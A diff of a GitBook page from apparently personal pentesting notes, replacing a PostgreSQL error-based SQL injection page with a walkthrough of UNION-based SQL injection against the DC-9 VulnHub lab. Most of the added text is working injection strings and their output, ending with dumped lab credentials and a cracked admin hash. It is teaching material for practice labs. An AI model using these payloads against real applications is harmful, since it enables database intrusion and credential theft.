@@ -4,7 +4,7 @@
     <head>
         <meta charset="UTF-8">
         <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
-        <title>postgreSQL Server · GitBook</title>
+        <title>Example · GitBook</title>
         <meta http-equiv="X-UA-Compatible" content="IE=edge" />
         <meta name="description" content="">
         <meta name="generator" content="GitBook 3.2.3">
@@ -57,10 +57,10 @@
     <link rel="shortcut icon" href="../../../gitbook/images/favicon.ico" type="image/x-icon">
 
     
-    <link rel="next" href="../blind-sqli/" />
+    <link rel="next" href="../error-based-sqli/" />
     
     
-    <link rel="prev" href="mysql-server.html" />
+    <link rel="prev" href="./" />
     
 
     </head>
@@ -168,9 +168,9 @@
             
         </li>
     
-        <li class="chapter " data-level="2.2.2" data-path="../in-band-sqli/">
+        <li class="chapter " data-level="2.2.2" data-path="./">
             
-                <a href="../in-band-sqli/">
+                <a href="./">
             
                     
                     In-band SQLi
@@ -182,9 +182,9 @@
             <ul class="articles">
                 
     
-        <li class="chapter " data-level="2.2.2.1" data-path="../in-band-sqli/example.html">
+        <li class="chapter active" data-level="2.2.2.1" data-path="example.html">
             
-                <a href="../in-band-sqli/example.html">
+                <a href="example.html">
             
                     
                     Example
@@ -200,9 +200,9 @@
             
         </li>
     
-        <li class="chapter " data-level="2.2.3" data-path="./">
+        <li class="chapter " data-level="2.2.3" data-path="../error-based-sqli/">
             
-                <a href="./">
+                <a href="../error-based-sqli/">
             
                     
                     Error-based SQLi
@@ -214,9 +214,9 @@
             <ul class="articles">
                 
     
-        <li class="chapter " data-level="2.2.3.1" data-path="mssql-server.html">
+        <li class="chapter " data-level="2.2.3.1" data-path="../error-based-sqli/mssql-server.html">
             
-                <a href="mssql-server.html">
+                <a href="../error-based-sqli/mssql-server.html">
             
                     
                     MSSQL Server
@@ -227,9 +227,9 @@
             
         </li>
     
-        <li class="chapter " data-level="2.2.3.2" data-path="mysql-server.html">
+        <li class="chapter " data-level="2.2.3.2" data-path="../error-based-sqli/mysql-server.html">
             
-                <a href="mysql-server.html">
+                <a href="../error-based-sqli/mysql-server.html">
             
                     
                     MySQL Server
@@ -240,9 +240,9 @@
             
         </li>
     
-        <li class="chapter active" data-level="2.2.3.3" data-path="postgresql-server.html">
+        <li class="chapter " data-level="2.2.3.3" data-path="../error-based-sqli/postgresql-server.html">
             
-                <a href="postgresql-server.html">
+                <a href="../error-based-sqli/postgresql-server.html">
             
                     
                     postgreSQL Server
@@ -566,7 +566,7 @@
     <!-- Title -->
     <h1>
         <i class="fa fa-circle-o-notch fa-spin"></i>
-        <a href="../../.." >postgreSQL Server</a>
+        <a href="../../.." >Example</a>
     </h1>
 </div>
 
@@ -581,22 +581,152 @@
     
                                 <section class="normal markdown-section">
                                 
-                                <h1 id="postgresql-server">postgreSQL Server</h1>
-<p>To exploit a SQLi on a web application using PostgreSQL, you have to leverage the cast technique we saw for MSSQL</p>
-<p>You can use this technique to extract the DB version:</p>
-<pre><code class="lang-text"># select cast(version() as numeric);
-
-ERROR: invalid input syntax for type numeric: &quot;PostgreSQL 9.1.15 on x86_64-unknown-linux-gnu, compiled by gg (Debian 4.7.2-5) 4.7.2, 64-bit&quot;
+                                <h1 id="example">Example</h1>
+<p>I&apos;m using DC-9 from VulnHub as an example.</p>
+<p>What we are exploring:</p>
+<p><img src="../../../.gitbook/assets/18b4269b74584646a3c791cb5a53dbb1.png" alt=""></p>
+<p>How does it behave when searching for &apos;Tom&apos;:</p>
+<p><img src="../../../.gitbook/assets/c69dbe5bcc0e441496cc0430698b8cb7.png" alt=""></p>
+<p>Trying <code>Tom&apos; OR &apos;1&apos; = &apos;1</code> returns nothing</p>
+<p>Trying a commentary: <code>Tom&apos; -- -</code> returns the result normally, so we identified it is vulnerable to SQLi. This is the query we will be developing from.</p>
+<p>So now, we need to define some stuff:</p>
+<p><strong>1. What we think the query is:</strong>  </p>
+<p><code>SELECT * FROM USERS WHERE FIRST_NAME = &apos;userinput&apos;-- -</code></p>
+<p><strong>2. What we want to do:</strong> </p>
+<p>Explore UNION queries to gather data.</p>
+<p><strong>3. What do we need to do UNION:</strong> </p>
+<p>Understand the * from the first query. Because UNION only works when the query is balanced in a sense that you need both the primary and the subquery to parse the same number of &apos;fields&apos;.</p>
+<p>We already have a pretty good indicator to how many fields that * is representing, since the result returns 5 different values:</p>
+<p>ID<br>Name<br>Position<br>Phone<br>Email</p>
+<p>So this is at least 5 fields. To make sure this is the right answer, we can simply UNION SELECT like this:</p>
+<pre><code class="lang-text">Tom&apos; UNION SELECT 1,2,3,4,5-- -
 </code></pre>
-<p>Or the tables, by iterating over the information_schema special database:</p>
-<pre><code class="lang-text">dbname=# select cast ((select table name from information schema.tables limit 1 offset 0) as numeric); 
-ERROR: invalid input syntax for type numeric: &quot;pg_statistic&quot;
+<p>You need to remember that the UNION SELECT is a subquery and it needs to respect the field number of the primary query.</p>
+<p>When trying that query though, it returns nothing, this means that it actually don&apos;t have 5 fields. What we can do to discover how many are there, we can basically start from 1 field and increase the value each query until it returns correctly.</p>
+<pre><code class="lang-text">Tom&apos; UNION SELECT 1-- -
+Tom&apos; UNION SELECT 1,2-- -
+Tom&apos; UNION SELECT 1,2,3-- -
+...
+Tom&apos; UNION SELECT 1,2,3,4,5,6-- -
+</code></pre>
+<p>We can put that through a proxy (I&apos;m using OWASPZAP, but you can use BURP). Or put that direct in the browser. Ill use the browser as example because its better to visualize and explain, but you should be doing all this inside your proxy.</p>
+<p>When querying with 6 fields:</p>
+<pre><code class="lang-text">Tom&apos; UNION SELECT 1,2,3,4,5,6-- -
+</code></pre>
+<p>This is what we see:</p>
+<p><img src="../../../.gitbook/assets/54f6d4677b694bc0901a247e2585031a.png" alt=""></p>
+<p>So there are actually 6 fields, the Name field can be divided in FIRST_NAME and LAST_NAME</p>
+<p>So the query becomes:</p>
+<pre><code class="lang-text">SELECT ID, FIRST_NAME, LAST_NAME, POSITION, PHONE, MAIL FROM USERS WHERE FIRST_NAME = &apos;userinput&apos;-- -
+</code></pre>
+<p>Now that we know how many fields there are, we can start gathering data, for example, which database we are in right now. Since the UNION subquery is already working, we can simply replace one of the 6 fields to something we want to:</p>
+<pre><code class="lang-text">Tom&apos; UNION SELECT database(),2,3,4,5,6-- -
+</code></pre>
+<p><img src="../../../.gitbook/assets/6c36787b99ae437588beba86afe2eb81.png" alt=""></p>
+<p>So now we know that the database is Staff.</p>
+<p>Now we can request information from the main 3 tables from the information_schema database, which is like the metadata.</p>
+<p>schema_name inside INFORMATION_SCHEMA.SCHEMATA = Stores database names<br>INFORMATION_SCHEMA.TABLES = Stores tables names<br>INFORMATION_SCHEMA.COLUMNS = Stores columns names</p>
+<p>To gather database names, for example, we can:</p>
+<pre><code class="lang-text">Tom&apos; UNION SELECT SCHEMA_NAME,2,3,4,5,6 FROM information_schema.schemata-- -
+</code></pre>
+<p>Which returns the current database name, however, we can use the LIMIT function to discover the other databases names:</p>
+<pre><code class="lang-text">Tom&apos; UNION SELECT SCHEMA_NAME,2,3,4,5,6 FROM information_schema.schemata LIMIT 1,1-- -
+which returns:
+ID: information_schema&lt;br/&gt;Name: 2 3&lt;br/&gt;Position: 4&lt;br /&gt;Phone No: 5&lt;br /&gt;Email: 6&lt;br/&gt;&lt;br/&gt;
 
-dbname=# select cast ((select table name from information schema.tables limit 1 offset 1) as numeric); 
-ERROR: invalid input syntax for type numeric: &quot;pg_type&quot;
+Tom&apos; UNION SELECT SCHEMA_NAME,2,3,4,5,6 FROM information_schema.schemata LIMIT 2,1-- -
+Which returns:
+ID: Staff&lt;br/&gt;Name: 2 3&lt;br/&gt;Position: 4&lt;br /&gt;Phone No: 5&lt;br /&gt;Email: 6&lt;br/&gt;&lt;br/&gt;
 
-dbname=# select cast ((select table name from information schema.tables limit 1 offset 2) as numeric); 
-ERROR: invalid input syntax for type numeric: &quot;pg_attribute&quot;
+Tom&apos; UNION SELECT SCHEMA_NAME,2,3,4,5,6 FROM information_schema.schemata LIMIT 3,1-- -
+Which returns:
+ID: users&lt;br/&gt;Name: 2 3&lt;br/&gt;Position: 4&lt;br /&gt;Phone No: 5&lt;br /&gt;Email: 6&lt;br/&gt;&lt;br/&gt;
+</code></pre>
+<p>When it stops returning data, you know you verified all possible values.</p>
+<p>Other way to gather this information is to use group_concat, which puts every value in a single line:</p>
+<pre><code class="lang-text">Tom&apos; UNION SELECT group_concat(SCHEMA_NAME),2,3,4,5,6 FROM information_schema.schemata-- -
+Which returns:
+ID: information_schema,Staff,users&lt;br/&gt;Name: 2 3&lt;br/&gt;Position: 4&lt;br /&gt;Phone No: 5&lt;br /&gt;Email: 6&lt;br/&gt;&lt;br/&gt;
+</code></pre>
+<p><strong>From now on, I&apos;ll be ommiting part of the output and formatting the important part for a better understanding.</strong></p>
+<p>Since we discovered all the existent databases, now we need to discover the tables. Lets start with the staff db:</p>
+<pre><code class="lang-text">Tom&apos; UNION SELECT group_concat(TABLE_NAME),2,3,4,5,6 FROM information_schema.tables where table_schema = &quot;Staff&quot;-- -
+Which returns:
+StaffDetails
+Users
+</code></pre>
+<p>So now we now that there are only two tables inside Staff database: StaffDetails and Users.</p>
+<p>Now, lets discover the columns in each of this tables:</p>
+<pre><code class="lang-text">Tom&apos; UNION SELECT group_concat(COLUMN_NAME),2,3,4,5,6 FROM information_schema.columns where table_schema = &quot;Staff&quot; AND table_name = &quot;StaffDetails&quot;-- -
+Which returns:
+id
+firstname
+lastname
+position
+phone
+email
+reg_date
+</code></pre>
+<p>Now for Users:</p>
+<pre><code class="lang-text">Tom&apos; UNION SELECT group_concat(COLUMN_NAME),2,3,4,5,6 FROM information_schema.columns where table_schema = &quot;Staff&quot; AND table_name = &quot;Users&quot;-- -
+Which returns:
+UserID
+Username
+Password
+</code></pre>
+<p>Another way to discover where each column is located is using a second parameter in concat:</p>
+<pre><code class="lang-text">Tom&apos; UNION SELECT group_concat(TABLE_NAME,&quot;:&quot;,COLUMN_NAME),2,3,4,5,6 FROM information_schema.columns where table_schema = &quot;Staff&quot;-- - 
+Which returns:
+
+StaffDetails:id
+StaffDetails:firstname
+StaffDetails:lastname
+StaffDetails:position
+StaffDetails:phone
+StaffDetails:email
+StaffDetails:reg_date
+Users:UserID
+Users:Username
+Users:Password
+</code></pre>
+<p>Now, since we already discoverd the structure of the Staff table, we can do the same to the database users:</p>
+<pre><code class="lang-text">search=Tom&apos; UNION SELECT group_concat(TABLE_NAME,&quot;:&quot;,COLUMN_NAME),2,3,4,5,6 FROM information_schema.columns where table_schema = &quot;users&quot;-- - 
+Which returns:
+
+UserDetails:id
+UserDetails:firstname
+UserDetails:lastname
+UserDetails:username
+UserDetails:password
+UserDetails:reg_date
+</code></pre>
+<p>After all this work, we can start analyzing the database and then gather information we consider useful. We have two different sets of username and passwords, one from Staff.Users and other from users.UserDetails</p>
+<pre><code class="lang-text">Tom&apos; UNION SELECT group_concat(Username,&quot;:&quot;,Password),2,3,4,5,6 FROM Staff.Users-- - 
+Which returns:
+admin:856f5de590ef37314e7c3bdf6f8a66dc
+
+after brute-forcing it:
+admin:transorbital1
+</code></pre>
+<pre><code class="lang-text">search=Tom&apos; UNION SELECT group_concat(Username,&quot;:&quot;,Password),2,3,4,5,6 FROM users.UserDetails -- - 
+Which returns:
+marym:3kfs86sfd
+julied:468sfdfsd2
+fredf:4sfd87sfd1
+barneyr:RocksOff
+tomc:TC&amp;TheBoyz
+jerrym:B8m#48sd
+wilmaf:Pebbles
+bettyr:BamBam01
+chandlerb:UrAG0D!
+joeyt:Passw0rd
+rachelg:yN72#dsd
+rossg:ILoveRachel
+monicag:3248dsds7s
+phoebeb:smellycats
+scoots:YR3BVxxxw87
+janitor:Ilovepeepee
+janitor2:Hawaii-Five-0
 </code></pre>
 
                                 
@@ -625,12 +755,12 @@ ERROR: invalid input syntax for type numeric: &quot;pg_attribute&quot;
 
             
                 
-                <a href="mysql-server.html" class="navigation navigation-prev " aria-label="Previous page: MySQL Server">
+                <a href="./" class="navigation navigation-prev " aria-label="Previous page: In-band SQLi">
                     <i class="fa fa-angle-left"></i>
                 </a>
                 
                 
-                <a href="../blind-sqli/" class="navigation navigation-next " aria-label="Next page: Blind SQLi">
+                <a href="../error-based-sqli/" class="navigation navigation-next " aria-label="Next page: Error-based SQLi">
                     <i class="fa fa-angle-right"></i>
                 </a>
                 
@@ -641,7 +771,7 @@ ERROR: invalid input syntax for type numeric: &quot;pg_attribute&quot;
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"postgreSQL Server","level":"2.2.3.3","depth":3,"next":{"title":"Blind SQLi","level":"2.2.4","depth":2,"path":"web-stuff/sqli/blind-sqli/README.md","ref":"web-stuff/sqli/blind-sqli/README.md","articles":[{"title":"Bisection Technique","level":"2.2.4.1","depth":3,"path":"web-stuff/sqli/blind-sqli/bisection-technique.md","ref":"web-stuff/sqli/blind-sqli/bisection-technique.md","articles":[]},{"title":"Time-Based Blind SQLi","level":"2.2.4.2","depth":3,"path":"web-stuff/sqli/blind-sqli/time-based-blind-sqli.md","ref":"web-stuff/sqli/blind-sqli/time-based-blind-sqli.md","articles":[]}]},"previous":{"title":"MySQL Server","level":"2.2.3.2","depth":3,"path":"web-stuff/sqli/error-based-sqli/mysql-server.md","ref":"web-stuff/sqli/error-based-sqli/mysql-server.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"web-stuff/sqli/error-based-sqli/postgresql-server.md","mtime":"2020-08-01T10:54:50.176Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2020-08-01T13:56:26.015Z"},"basePath":"../../..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"Example","level":"2.2.2.1","depth":3,"next":{"title":"Error-based SQLi","level":"2.2.3","depth":2,"path":"web-stuff/sqli/error-based-sqli/README.md","ref":"web-stuff/sqli/error-based-sqli/README.md","articles":[{"title":"MSSQL Server","level":"2.2.3.1","depth":3,"path":"web-stuff/sqli/error-based-sqli/mssql-server.md","ref":"web-stuff/sqli/error-based-sqli/mssql-server.md","articles":[]},{"title":"MySQL Server","level":"2.2.3.2","depth":3,"path":"web-stuff/sqli/error-based-sqli/mysql-server.md","ref":"web-stuff/sqli/error-based-sqli/mysql-server.md","articles":[]},{"title":"postgreSQL Server","level":"2.2.3.3","depth":3,"path":"web-stuff/sqli/error-based-sqli/postgresql-server.md","ref":"web-stuff/sqli/error-based-sqli/postgresql-server.md","articles":[]}]},"previous":{"title":"In-band SQLi","level":"2.2.2","depth":2,"path":"web-stuff/sqli/in-band-sqli/README.md","ref":"web-stuff/sqli/in-band-sqli/README.md","articles":[{"title":"Example","level":"2.2.2.1","depth":3,"path":"web-stuff/sqli/in-band-sqli/example.md","ref":"web-stuff/sqli/in-band-sqli/example.md","articles":[]}]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"web-stuff/sqli/in-band-sqli/example.md","mtime":"2020-08-01T10:54:50.192Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2020-08-01T13:56:26.015Z"},"basePath":"../../..","book":{"language":""}});
         });
     </script>
 </div>
